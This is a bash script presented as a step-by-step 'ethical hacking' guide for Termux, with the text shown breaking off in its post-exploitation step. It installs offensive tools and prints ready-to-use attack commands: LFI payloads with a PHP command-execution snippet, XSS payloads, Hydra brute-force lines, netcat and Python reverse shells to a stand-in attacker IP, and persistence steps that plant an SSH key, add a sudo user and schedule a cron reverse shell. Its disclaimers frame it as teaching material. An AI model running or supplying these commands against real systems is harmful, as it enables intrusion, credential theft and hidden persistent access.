#!/bin/bash
# ============================================================
# Ethical Hacking Step-by-Step Guide for Termux
# Author: Emmanuel suah
# Version: 1.0
# ============================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color
BOLD='\033[1m'

# Clear screen
clear

# Banner
show_banner() {
    echo -e "${RED}╔══════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║    🔒 ETHICAL HACKING STEP-BY-STEP GUIDE 🔒      ║${NC}"
    echo -e "${RED}║              FOR TERMUX (v1.0)                    ║${NC}"
    echo -e "${RED}╚══════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${YELLOW}⚠️  DISCLAIMER: This tool is for EDUCATIONAL PURPOSES ONLY.${NC}"
    echo -e "${YELLOW}   Do NOT use these techniques on systems you don't own${NC}"
    echo -e "${YELLOW}   or have explicit permission to test. Unauthorized${NC}"
    echo -e "${YELLOW}   access is ILLEGAL and punishable by law.${NC}"
    echo ""
    echo -e "${GREEN}[✓] Ensure Termux is updated: apt update && apt upgrade -y${NC}"
    echo ""
}

# Pause function
pause() {
    echo ""
    read -p "Press [Enter] to continue..."
}

# Submenu for steps
show_main_menu() {
    echo ""
    echo -e "${BLUE}╔══════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║          📋 MAIN MENU - SELECT A PHASE          ║${NC}"
    echo -e "${BLUE}╠══════════════════════════════════════════════════╣${NC}"
    echo -e "${BLUE}║${NC}  ${GREEN}1)${NC} ${WHITE}STEP 1: Reconnaissance & OSINT${NC}"
    echo -e "${BLUE}║${NC}  ${GREEN}2)${NC} ${WHITE}STEP 2: Scanning & Enumeration${NC}"
    echo -e "${BLUE}║${NC}  ${GREEN}3)${NC} ${WHITE}STEP 3: Vulnerability Assessment${NC}"
    echo -e "${BLUE}║${NC}  ${GREEN}4)${NC} ${WHITE}STEP 4: Web Application Testing${NC}"
    echo -e "${BLUE}║${NC}  ${GREEN}5)${NC} ${WHITE}STEP 5: Password Attacks${NC}"
    echo -e "${BLUE}║${NC}  ${GREEN}6)${NC} ${WHITE}STEP 6: Exploitation${NC}"
    echo -e "${BLUE}║${NC}  ${GREEN}7)${NC} ${WHITE}STEP 7: Post-Exploitation${NC}"
    echo -e "${BLUE}║${NC}  ${GREEN}8)${NC} ${WHITE}STEP 8: Reporting${NC}"
    echo -e "${BLUE}║${NC}  ${RED}0)${NC} ${YELLOW}Exit${NC}"
    echo -e "${BLUE}╚══════════════════════════════════════════════════╝${NC}"
    echo ""
    read -p "Select a step (0-8): " choice

    case $choice in
        1) step1_recon ;;
        2) step2_scanning ;;
        3) step3_vuln_assess ;;
        4) step4_web_testing ;;
        5) step5_password ;;
        6) step6_exploitation ;;
        7) step7_post_exploit ;;
        8) step8_reporting ;;
        0) 
            echo -e "${GREEN}[+] Thank you for using Ethical Hacking Guide!${NC}"
            echo -e "${GREEN}[+] Stay ethical. Stay legal. Stay safe.${NC}"
            exit 0
            ;;
        *) 
            echo -e "${RED}[!] Invalid option. Try again.${NC}"
            sleep 1
            show_main_menu
            ;;
    esac
}

# ============================================================
# STEP 1: Reconnaissance & OSINT
# ============================================================
step1_recon() {
    clear
    show_banner
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}${BOLD}          STEP 1: RECONNAISSANCE & OSINT              ${NC}"
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${YELLOW}📌 PURPOSE:${NC} Gather information about your target (domain, IP, people)"
    echo -e "${YELLOW}📌 GOAL:${NC} Map the attack surface before any active testing"
    echo ""
    echo -e "${MAGENTA}─────────── SUB-STEPS ────────────${NC}"
    echo ""
    echo -e "${WHITE}1a)${NC} WHOIS Lookup - Find domain registration info"
    echo -e "${WHITE}1b)${NC} DNS Enumeration - Find subdomains & DNS records"
    echo -e "${WHITE}1c)${NC} OSINT - Find emails, IPs, social profiles"
    echo ""

    # Install tools
    echo -e "${BLUE}[*] Installing tools for Step 1...${NC}"
    pkg install -y whois dnsutils python git 2>/dev/null

    # Sub-step 1a: WHOIS
    echo ""
    echo -e "${GREEN}── SUB-STEP 1a: WHOIS Lookup ──${NC}"
    echo -e "${WHITE}Command:${NC} whois <target-domain>"
    echo -e "${WHITE}Example:${NC} whois example.com"
    echo ""
    echo -e "${BLUE}What to look for:${NC}"
    echo "  - Registrar info"
    echo "  - Registration/Expiry dates"
    echo "  - Name servers"
    echo "  - Contact emails & addresses"
    echo ""

    # Sub-step 1b: DNS Enumeration
    echo -e "${GREEN}── SUB-STEP 1b: DNS Enumeration ──${NC}"
    echo -e "${WHITE}Commands:${NC}"
    echo "  dig target.com ANY"
    echo "  dig target.com MX"
    echo "  dig target.com NS"
    echo "  dig target.com TXT"
    echo "  host -t A target.com"
    echo "  host -t CNAME www.target.com"
    echo ""

    # Sub-step 1c: OSINT with theHarvester
    echo -e "${GREEN}── SUB-STEP 1c: OSINT with theHarvester ──${NC}"
    echo -e "${BLUE}[*] Installing theHarvester...${NC}"
    
    if [ ! -d "$HOME/theHarvester" ]; then
        echo "y" | pip install theHarvester 2>/dev/null || {
            echo -e "${YELLOW}[*] Cloning theHarvester from GitHub...${NC}"
            git clone https://github.com/laramies/theHarvester.git $HOME/theHarvester
        }
    fi
    
    echo -e "${WHITE}Commands:${NC}"
    echo "  cd \$HOME/theHarvester"
    echo "  python3 theHarvester.py -d target.com -b google"
    echo "  python3 theHarvester.py -d target.com -b bing"
    echo "  python3 theHarvester.py -d target.com -b linkedin"
    echo ""
    echo -e "${BLUE}What to collect:${NC}"
    echo "  - Email addresses"
    echo "  - Subdomains"
    echo "  - IP addresses"
    echo "  - Employee names"
    echo ""

    # Sherlock for username search
    echo -e "${GREEN}── SUB-STEP 1d: Social Media OSINT with Sherlock ──${NC}"
    echo -e "${BLUE}[*] Installing Sherlock...${NC}"
    if [ ! -d "$HOME/sherlock" ]; then
        git clone https://github.com/sherlock-project/sherlock.git $HOME/sherlock
    fi
    echo -e "${WHITE}Command:${NC}"
    echo "  cd \$HOME/sherlock && python3 sherlock <username>"
    echo ""

    echo -e "${GREEN}✅ STEP 1 COMPLETE! You've gathered target information.${NC}"
    echo ""
    echo -e "${YELLOW}➡️ NEXT STEP:${NC} Proceed to STEP 2 (Scanning & Enumeration)"
    echo ""

    read -p "Go to Step 2? (y/n/menu): " next
    if [[ "$next" == "y" || "$next" == "Y" ]]; then
        step2_scanning
    else
        show_main_menu
    fi
}

# ============================================================
# STEP 2: Scanning & Enumeration
# ============================================================
step2_scanning() {
    clear
    show_banner
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}${BOLD}         STEP 2: SCANNING & ENUMERATION               ${NC}"
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${YELLOW}📌 PURPOSE:${NC} Discover live hosts, open ports, running services"
    echo -e "${YELLOW}📌 GOAL:${NC} Build a map of the target's network infrastructure"
    echo ""
    echo -e "${MAGENTA}─────────── SUB-STEPS ────────────${NC}"
    echo ""
    echo -e "${WHITE}2a)${NC} Host Discovery - Find live hosts"
    echo -e "${WHITE}2b)${NC} Port Scanning with Nmap"
    echo -e "${WHITE}2c)${NC} Service & Version Detection"
    echo -e "${WHITE}2d)${NC} OS Detection"
    echo ""

    # Install nmap
    echo -e "${BLUE}[*] Installing Nmap...${NC}"
    pkg install -y nmap 2>/dev/null

    # Sub-step 2a: Host Discovery
    echo ""
    echo -e "${GREEN}── SUB-STEP 2a: Host Discovery ──${NC}"
    echo -e "${WHITE}Commands:${NC}"
    echo "  nmap -sn <target-IP-range>"
    echo "  Example: nmap -sn 192.168.1.0/24"
    echo ""
    echo -e "${BLUE}Explanation:${NC}"
    echo "  -sn = Ping scan (no port scan), finds live hosts"
    echo ""

    # Sub-step 2b: Port Scanning
    echo -e "${GREEN}── SUB-STEP 2b: Port Scanning ──${NC}"
    echo -e "${WHITE}Commands:${NC}"
    echo "  nmap -p- <target-IP>           # Scan all 65535 ports"
    echo "  nmap -p 1-1000 <target-IP>     # Scan top 1000 ports"
    echo "  nmap -F <target-IP>             # Fast scan (top 100)"
    echo "  nmap -sS -sV -O <target-IP>    # SYN scan + version + OS"
    echo ""
    echo -e "${BLUE}Port States:${NC}"
    echo "  open       - Service accepting connections"
    echo "  closed     - No service on this port"
    echo "  filtered   - Firewall blocking probe"
    echo ""

    # Sub-step 2c: Service Detection
    echo -e "${GREEN}── SUB-STEP 2c: Service & Version Detection ──${NC}"
    echo -e "${WHITE}Commands:${NC}"
    echo "  nmap -sV --version-intensity 9 <target-IP>"
    echo "  nmap -sC -sV <target-IP>          # Default scripts + version"
    echo ""

    # Sub-step 2d: OS Detection
    echo -e "${GREEN}── SUB-STEP 2d: OS Detection ──${NC}"
    echo -e "${WHITE}Commands:${NC}"
    echo "  nmap -O <target-IP>"
    echo "  nmap -A <target-IP>               # Aggressive scan (all-in-one)"
    echo ""

    # UDP Scanning
    echo -e "${GREEN}── BONUS: UDP Scanning ──${NC}"
    echo -e "${WHITE}Commands:${NC}"
    echo "  nmap -sU --top-ports 100 <target-IP>"
    echo ""
    echo -e "${YELLOW}Note: UDP scanning is slow. Be patient.${NC}"
    echo ""

    # Save scan results
    echo -e "${GREEN}── SAVING RESULTS ──${NC}"
    echo -e "${WHITE}Commands:${NC}"
    echo "  nmap -sV -oN scan_results.txt <target-IP>"
    echo "  nmap -sV -oX scan_results.xml <target-IP>"
    echo ""

    echo -e "${GREEN}✅ STEP 2 COMPLETE! You know what ports & services are open.${NC}"
    echo ""
    echo -e "${YELLOW}➡️ NEXT STEP:${NC} Proceed to STEP 3 (Vulnerability Assessment)"
    echo -e "${YELLOW}   OR${NC} go back to STEP 1 if you need more OSINT"
    echo ""

    read -p "Go to Step 3? (y/n/menu): " next
    case "$next" in
        y|Y) step3_vuln_assess ;;
        *) show_main_menu ;;
    esac
}

# ============================================================
# STEP 3: Vulnerability Assessment
# ============================================================
step3_vuln_assess() {
    clear
    show_banner
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}${BOLD}        STEP 3: VULNERABILITY ASSESSMENT              ${NC}"
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${YELLOW}📌 PURPOSE:${NC} Find known vulnerabilities in target services"
    echo -e "${YELLOW}📌 GOAL:${NC} Identify exploitable weaknesses"
    echo ""
    echo -e "${MAGENTA}─────────── SUB-STEPS ────────────${NC}"
    echo ""
    echo -e "${WHITE}3a)${NC} Nmap NSE Vulnerability Scripts"
    echo -e "${WHITE}3b)${NC} Search for CVEs manually"
    echo -e "${WHITE}3c)${NC} Web vulnerability scanning (Nikto)"
    echo ""

    echo -e "${BLUE}[*] Setting up vulnerability assessment tools...${NC}"
    pkg install -y nmap 2>/dev/null

    # Sub-step 3a: Nmap NSE Vuln Scripts
    echo ""
    echo -e "${GREEN}── SUB-STEP 3a: Nmap Vulnerability Scripts ──${NC}"
    echo -e "${WHITE}Commands:${NC}"
    echo "  nmap --script=vuln <target-IP>"
    echo "  nmap --script=ssl-enum-ciphers <target-IP>"
    echo "  nmap --script=http-vuln* <target-IP>"
    echo "  nmap --script=smb-vuln* <target-IP> -p 445"
    echo "  nmap --script=ftp-vsftpd-backdoor <target-IP> -p 21"
    echo ""

    # Sub-step 3b: CVE Search
    echo -e "${GREEN}── SUB-STEP 3b: Manual CVE Research ──${NC}"
    echo -e "${WHITE}Websites to search:${NC}"
    echo "  - https://www.cvedetails.com"
    echo "  - https://nvd.nist.gov"
    echo "  - https://www.exploit-db.com"
    echo "  - https://cve.mitre.org"
    echo ""
    echo -e "${WHITE}From your Termux:${NC}"
    echo "  curl -s 'https://cve.circl.lu/api/search/apache' | python3 -m json.tool"
    echo ""

    # Sub-step 3c: Nikto Web Scanner
    echo -e "${GREEN}── SUB-STEP 3c: Web Scanner (Nikto) ──${NC}"
    echo -e "${BLUE}[*] Note: Nikto requires a full Linux environment.${NC}"
    echo "  Consider using it via proot-distro with Ubuntu/Debian:"
    echo ""
    echo "  # Install proot-distro (if not installed)"
    echo "  pkg install proot-distro -y"
    echo "  proot-distro install ubuntu"
    echo "  proot-distro login ubuntu"
    echo "  apt install nikto -y"
    echo "  nikto -h http://target.com"
    echo ""

    # Nuclei (alternative)
    echo -e "${GREEN}── ALTERNATIVE: Nuclei (Modern Vulnerability Scanner) ──${NC}"
    echo -e "${BLUE}[*] Installing Nuclei...${NC}"
    echo ""
    echo "  # Method 1: Download binary"
    echo "  wget https://github.com/projectdiscovery/nuclei/releases/latest/download/nuclei_3.0_linux_arm64.zip"
    echo "  unzip nuclei_3.0_linux_arm64.zip"
    echo "  mv nuclei \$PREFIX/bin/"
    echo ""
    echo "  # Install templates"
    echo "  nuclei -update-templates"
    echo ""
    echo "  # Usage"
    echo "  nuclei -u http://target.com"
    echo "  nuclei -l urls.txt -t cves/"
    echo ""

    echo -e "${GREEN}✅ STEP 3 COMPLETE! You've identified vulnerabilities.${NC}"
    echo ""
    echo -e "${YELLOW}➡️ NEXT STEPS:${NC}"
    echo "  → If target is a WEB APP → Go to STEP 4 (Web App Testing)"
    echo "  → If you found exploits → Go to STEP 6 (Exploitation)"
    echo ""

    read -p "Select next step (4/web, 6/exploit, menu): " next
    case "$next" in
        4|web) step4_web_testing ;;
        6|exploit) step6_exploitation ;;
        *) show_main_menu ;;
    esac
}

# ============================================================
# STEP 4: Web Application Testing
# ============================================================
step4_web_testing() {
    clear
    show_banner
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}${BOLD}         STEP 4: WEB APPLICATION TESTING              ${NC}"
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${YELLOW}📌 PURPOSE:${NC} Test websites and web applications for vulnerabilities"
    echo -e "${YELLOW}📌 GOAL:${NC} Find SQL injection, XSS, LFI/RFI, and other web vulns"
    echo ""
    echo -e "${MAGENTA}─────────── SUB-STEPS ────────────${NC}"
    echo ""
    echo -e "${WHITE}4a)${NC} SQL Injection Testing (sqlmap)"
    echo -e "${WHITE}4b)${NC} Directory & File Brute-forcing (Dirb/Dirsearch)"
    echo -e "${WHITE}4c)${NC} XSS Testing"
    echo -e "${WHITE}4d)${NC} LFI/RFI Testing"
    echo ""

    # SQLMap
    echo -e "${BLUE}[*] Installing sqlmap...${NC}"
    pkg install -y python git 2>/dev/null
    if [ ! -d "$HOME/sqlmap" ]; then
        git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git $HOME/sqlmap
    fi

    echo ""
    echo -e "${GREEN}── SUB-STEP 4a: SQL Injection with sqlmap ──${NC}"
    echo -e "${WHITE}Basic Commands:${NC}"
    echo "  cd \$HOME/sqlmap"
    echo "  python3 sqlmap.py -u 'http://target.com/page?id=1' --dbs"
    echo "  python3 sqlmap.py -u 'http://target.com/page?id=1' -D dbname --tables"
    echo "  python3 sqlmap.py -u 'http://target.com/page?id=1' -D dbname -T tablename --dump"
    echo ""
    echo -e "${WHITE}POST-based injection:${NC}"
    echo "  python3 sqlmap.py -u 'http://target.com/login' --data='user=admin&pass=1'"
    echo ""
    echo -e "${WHITE}Cookie-based injection:${NC}"
    echo "  python3 sqlmap.py -u 'http://target.com/page' --cookie='PHPSESSID=abc123'"
    echo ""
    echo -e "${YELLOW}TIP: Always start with --dbs to list databases first!${NC}"
    echo ""

    # Dirsearch
    echo -e "${GREEN}── SUB-STEP 4b: Directory Brute-forcing ──${NC}"
    echo -e "${BLUE}[*] Installing dirsearch...${NC}"
    if [ ! -d "$HOME/dirsearch" ]; then
        git clone https://github.com/maurosoria/dirsearch.git $HOME/dirsearch
    fi
    echo -e "${WHITE}Commands:${NC}"
    echo "  cd \$HOME/dirsearch"
    echo "  python3 dirsearch.py -u http://target.com -e php,html,txt,js"
    echo "  python3 dirsearch.py -u http://target.com -w /path/to/wordlist.txt"
    echo ""

    # XSS Testing
    echo -e "${GREEN}── SUB-STEP 4c: XSS Testing ──${NC}"
    echo -e "${WHITE}Manual Testing:${NC}"
    echo "  Try injecting in search fields, forms, URL parameters:"
    echo '  <script>alert("XSS")</script>'
    echo '  <img src=x onerror=alert("XSS")>'
    echo '  <svg onload=alert("XSS")>'
    echo ""
    echo -e "${WHITE}Automated (dalfox):${NC}"
    echo "  go install github.com/hahwul/dalfox/v2@latest   (requires Go)"
    echo "  dalfox url http://target.com?search=test"
    echo ""

    # LFI Testing
    echo -e "${GREEN}── SUB-STEP 4d: LFI/RFI Testing ──${NC}"
    echo -e "${WHITE}Common Payloads:${NC}"
    echo "  ?page=../../../etc/passwd"
    echo "  ?page=php://filter/convert.base64-encode/resource=config.php"
    echo "  ?page=php://input  (with POST data: <?php system(\$_GET['cmd']); ?>)"
    echo "  ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbSIpOz8+"
    echo ""

    # Additional web tools
    echo -e "${GREEN}── USEFUL ADDITIONAL TOOLS ──${NC}"
    echo -e "${WHITE}WPScan (WordPress):${NC}"
    echo "  pip install wpscan  OR  gem install wpscan"
    echo "  wpscan --url http://target.com --enumerate u,vp"
    echo ""
    echo -e "${WHITE}WhatWeb (Technology Detection):${NC}"
    echo "  pkg install whatweb"
    echo "  whatweb http://target.com"
    echo ""

    echo -e "${GREEN}✅ STEP 4 COMPLETE! You've tested the web application.${NC}"
    echo ""
    echo -e "${YELLOW}➡️ NEXT STEP:${NC} Go to STEP 5 (Password Attacks) or STEP 6 (Exploitation)"
    echo ""

    read -p "Select next step (5/pass, 6/exploit, menu): " next
    case "$next" in
        5|pass) step5_password ;;
        6|exploit) step6_exploitation ;;
        *) show_main_menu ;;
    esac
}

# ============================================================
# STEP 5: Password Attacks
# ============================================================
step5_password() {
    clear
    show_banner
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}${BOLD}              STEP 5: PASSWORD ATTACKS                 ${NC}"
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${YELLOW}📌 PURPOSE:${NC} Test password strength and attempt to crack credentials"
    echo -e "${YELLOW}📌 GOAL:${NC} Identify weak passwords through various attack methods"
    echo ""
    echo -e "${MAGENTA}⚠️  LEGAL WARNING: Only test passwords on systems YOU OWN${NC}"
    echo -e "${MAGENTA}   or have WRITTEN PERMISSION to test!${NC}"
    echo ""
    echo -e "${MAGENTA}─────────── SUB-STEPS ────────────${NC}"
    echo ""
    echo -e "${WHITE}5a)${NC} Online Brute-force (Hydra)"
    echo -e "${WHITE}5b)${NC} Offline Hash Cracking (John the Ripper / Hashcat)"
    echo -e "${WHITE}5c)${NC} Wordlist Generation (Crunch/CUPP)"
    echo ""

    # Hydra
    echo -e "${BLUE}[*] Installing Hydra...${NC}"
    pkg install -y hydra 2>/dev/null

    echo ""
    echo -e "${GREEN}── SUB-STEP 5a: Online Brute-force with Hydra ──${NC}"
    echo -e "${WHITE}Commands:${NC}"
    echo "  # SSH brute-force"
    echo "  hydra -l admin -P /path/to/wordlist.txt ssh://target-ip"
    echo ""
    echo "  # FTP brute-force"
    echo "  hydra -l admin -P wordlist.txt ftp://target-ip"
    echo ""
    echo "  # HTTP POST form brute-force"
    echo "  hydra -l admin -P wordlist.txt target-ip http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'"
    echo ""
    echo "  # MySQL brute-force"
    echo "  hydra -l root -P wordlist.txt mysql://target-ip"
    echo ""
    echo -e "${YELLOW}TIP: Use -t 4 to limit threads and avoid lockouts!${NC}"
    echo ""

    # John the Ripper
    echo -e "${GREEN}── SUB-STEP 5b: Offline Hash Cracking ──${NC}"
    echo -e "${BLUE}[*] Installing John the Ripper...${NC}"
    pkg install -y john 2>/dev/null || {
        echo "  # From source in Termux:"
        echo "  git clone https://github.com/openwall/john.git"
        echo "  cd john/src && ./configure && make -j4"
    }
    echo -e "${WHITE}Commands:${NC}"
    echo "  # Identify hash type"
    echo "  john --list=hash-formats | grep -i md5"
    echo ""
    echo "  # Crack MD5 hash"
    echo "  echo '0192023a7bbd73250516f069df18b500' > hash.txt"
    echo "  john --format=raw-md5 hash.txt --wordlist=wordlist.txt"
    echo ""
    echo "  # Show cracked passwords"
    echo "  john --show hash.txt"
    echo ""

    # Hashcat (if available)
    echo -e "${GREEN}── SUB-STEP 5b-b: Hashcat (GPU-accelerated) ──${NC}"
    echo -e "${YELLOW}Note: Hashcat may have limited support on ARM/termux${NC}"
    echo "  pkg install hashcat 2>/dev/null"
    echo "  hashcat -m 0 hash.txt wordlist.txt    # MD5"
    echo "  hashcat -m 100 hash.txt wordlist.txt  # SHA1"
    echo "  hashcat -m 1800 hash.txt wordlist.txt # sha512crypt"
    echo ""

    # Wordlist Generation
    echo -e "${GREEN}── SUB-STEP 5c: Wordlist Generation ──${NC}"
    echo -e "${BLUE}[*] Crunch (built-in):${NC}"
    echo "  crunch 4 6 abcdef12345 -o wordlist.txt"
    echo "  crunch 8 8 -t password@ -o wordlist.txt"
    echo ""
    echo -e "${BLUE}[*] CUPP (Common User Passwords Profiler):${NC}"
    if [ ! -d "$HOME/CUPP" ]; then
        git clone https://github.com/Mebus/cupp.git $HOME/CUPP
    fi
    echo "  cd \$HOME/CUPP && python3 cupp.py -i"
    echo ""

    # Common wordlists
    echo -e "${BLUE}[*] Download Wordlists:${NC}"
    echo "  # SecLists (comprehensive collection)"
    echo "  git clone https://github.com/danielmiessler/SecLists.git \$HOME/SecLists"
    echo "  ls \$HOME/SecLists/Passwords/"
    echo ""

    echo -e "${GREEN}✅ STEP 5 COMPLETE! You've tested password security.${NC}"
    echo ""
    echo -e "${YELLOW}➡️ NEXT STEP:${NC} Go to STEP 6 (Exploitation)"
    echo ""

    read -p "Go to Step 6? (y/n/menu): " next
    if [[ "$next" == "y" || "$next" == "Y" ]]; then
        step6_exploitation
    else
        show_main_menu
    fi
}

# ============================================================
# STEP 6: Exploitation
# ============================================================
step6_exploitation() {
    clear
    show_banner
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}${BOLD}              STEP 6: EXPLOITATION                     ${NC}"
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${YELLOW}📌 PURPOSE:${NC} Use discovered vulnerabilities to gain access"
    echo -e "${YELLOW}📌 GOAL:${NC} Achieve initial access to the target system"
    echo ""
    echo -e "${MAGENTA}⚠️  LEGAL WARNING: Only exploit systems you OWN or have${NC}"
    echo -e "${MAGENTA}   explicit WRITTEN AUTHORIZATION to test!${NC}"
    echo ""
    echo -e "${MAGENTA}─────────── SUB-STEPS ────────────${NC}"
    echo ""
    echo -e "${WHITE}6a)${NC} Metasploit Framework"
    echo -e "${WHITE}6b)${NC} Manual Exploitation"
    echo -e "${WHITE}6c)${NC} SearchSploit (Offline Exploit Database)"
    echo ""

    # SearchSploit
    echo -e "${GREEN}── SUB-STEP 6a: SearchSploit (Exploit Database) ──${NC}"
    echo -e "${BLUE}[*] Installing SearchSploit...${NC}"
    pkg install -y exploitdb 2>/dev/null
    echo -e "${WHITE}Commands:${NC}"
    echo "  searchsploit apache 2.4"
    echo "  searchsploit -t linux kernel"
    echo "  searchsploit -m 12345    # Copy exploit to current directory"
    echo "  searchsploit -u          # Update database"
    echo ""

    # Metasploit
    echo -e "${GREEN}── SUB-STEP 6b: Metasploit Framework ──${NC}"
    echo -e "${BLUE}[*] Installing Metasploit...${NC}"
    echo "  # Option 1: Install via pkg (limited)"
    echo "  pkg install metasploit -y 2>/dev/null"
    echo ""
    echo "  # Option 2: Use proot-distro (recommended)"
    echo "  pkg install proot-distro -y"
    echo "  proot-distro install ubuntu"
    echo "  proot-distro login ubuntu"
    echo "  apt install metasploit-framework -y"
    echo "  msfconsole"
    echo ""
    echo -e "${WHITE}Basic Metasploit Usage:${NC}"
    echo "  msfconsole                           # Start Metasploit"
    echo "  search <exploit name>                # Search exploits"
    echo "  use exploit/path/to/exploit          # Select exploit"
    echo "  show options                         # Show required options"
    echo "  set RHOSTS <target-ip>               # Set target"
    echo "  set LHOST <your-ip>                  # Set listener IP"
    echo "  exploit                              # Run exploit"
    echo "  sessions -l                          # List active sessions"
    echo "  sessions -i <id>                     # Interact with session"
    echo ""
    echo -e "${YELLOW}TIP: Use 'searchsploit' first to find the right exploit!${NC}"
    echo ""

    # Manual Exploitation
    echo -e "${GREEN}── SUB-STEP 6c: Manual Exploitation Examples ──${NC}"
    echo ""
    echo -e "${WHITE}SSH Login with cracked password:${NC}"
    echo "  ssh user@target-ip"
    echo ""
    echo -e "${WHITE}FTP Access:${NC}"
    echo "  ftp target-ip"
    echo "  # or use: curl ftp://user:pass@target-ip"
    echo ""
    echo -e "${WHITE}Reverse Shell (Netcat):${NC}"
    echo "  # On YOUR machine (listener):"
    echo "  nc -lvnp 4444"
    echo "  # On TARGET machine (run exploit/payload):"
    echo "  nc YOUR_IP 4444 -e /bin/bash"
    echo ""
    echo -e "${WHITE}Python Reverse Shell:${NC}"
    echo "  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"YOUR_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'"
    echo ""

    # SQLMap exploitation
    echo -e "${WHITE}SQLMap Data Dump:${NC}"
    echo "  python3 sqlmap.py -u 'http://target.com/page?id=1' --dump -D dbname -T tablename"
    echo ""

    echo -e "${GREEN}✅ STEP 6 COMPLETE! You've gained initial access.${NC}"
    echo ""
    echo -e "${YELLOW}➡️ NEXT STEP:${NC} Proceed to STEP 7 (Post-Exploitation)"
    echo ""

    read -p "Go to Step 7? (y/n/menu): " next
    if [[ "$next" == "y" || "$next" == "Y" ]]; then
        step7_post_exploit
    else
        show_main_menu
    fi
}

# ============================================================
# STEP 7: Post-Exploitation
# ============================================================
step7_post_exploit() {
    clear
    show_banner
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}${BOLD}            STEP 7: POST-EXPLOITATION                  ${NC}"
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${YELLOW}📌 PURPOSE:${NC} Maintain access, escalate privileges, gather more data"
    echo -e "${YELLOW}📌 GOAL:${NC} Deepen access and document findings"
    echo ""
    echo -e "${MAGENTA}─────────── SUB-STEPS ────────────${NC}"
    echo ""
    echo -e "${WHITE}7a)${NC} System Enumeration (on compromised host)"
    echo -e "${WHITE}7b)${NC} Privilege Escalation"
    echo -e "${WHITE}7c)${NC} Maintaining Access (Persistence)"
    echo -e "${WHITE}7d)${NC} Data Exfiltration"
    echo ""

    # System Enumeration
    echo -e "${GREEN}── SUB-STEP 7a: System Enumeration ──${NC}"
    echo -e "${WHITE}Linux Enumeration:${NC}"
    echo "  uname -a                    # Kernel & OS info"
    echo "  cat /etc/os-release         # OS details"
    echo "  id                          # Current user & groups"
    echo "  whoami                      # Current username"
    echo "  cat /etc/passwd             # All users"
    echo "  cat /etc/shadow             # Password hashes (need root)"
    echo "  sudo -l                      # Check sudo permissions"
    echo "  ifconfig / ip a             # Network interfaces"
    echo "  ps aux                      # Running processes"
    echo "  netstat -tlnp / ss -tlnp    # Open ports & connections"
    echo "  find / -perm -u=s -type f 2>/dev/null   # SUID binaries"
    echo "  crontab -l                  # Scheduled tasks"
    echo "  ls -la /var/spool/cron/     # Cron jobs"
    echo ""
    echo -e "${WHITE}Windows Enumeration:${NC}"
    echo "  systeminfo                   # System information"
    echo "  whoami /all                  # User privileges"
    echo "  net user                     # List users"
    echo "  net localgroup administrators # Admin group members"
    echo "  ipconfig /all                # Network config"
    echo "  tasklist                     # Running processes"
    echo ""

    # Privilege Escalation
    echo -e "${GREEN}── SUB-STEP 7b: Privilege Escalation ──${NC}"
    echo -e "${BLUE}[*] Tools:${NC}"
    echo ""
    echo -e "${WHITE}LinPEAS / LinEnum (Linux):${NC}"
    echo "  # Download on target:"
    echo "  wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
    echo "  chmod +x linpeas.sh"
    echo "  ./linpeas.sh"
    echo ""
    echo -e "${WHITE}Windows Privilege Escalation:${NC}"
    echo "  # Download WinPEAS on target:"
    echo "  wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe"
    echo "  winPEASx64.exe"
    echo ""
    echo -e "${WHITE}Common Linux PrivEsc Techniques:${NC}"
    echo "  - Check for SUID binaries: find / -perm -4000 2>/dev/null"
    echo "  - Check writable files: find / -writable -type f 2>/dev/null"
    echo "  - Check kernel exploits: linux-exploit-suggester.sh"
    echo "  - Check sudo misconfigurations: sudo -l"
    echo "  - GTFOBins: https://gtfobins.github.io/"
    echo ""

    # Persistence
    echo -e "${GREEN}── SUB-STEP 7c: Maintaining Access ──${NC}"
    echo -e "${WHITE}Methods (Linux):${NC}"
    echo "  # Add SSH key"
    echo "  mkdir -p ~/.ssh && echo 'YOUR_PUB_KEY' >> ~/.ssh/authorized_keys"
    echo ""
    echo "  # Add cron job"
    echo "  echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\"' | crontab -"
    echo ""
    echo "  # Add user"
    echo "  useradd -m -s /bin/bash hacker && echo 'hacker:password' | chpasswd"
    echo "  usermod -aG sudo hacker"
    echo ""
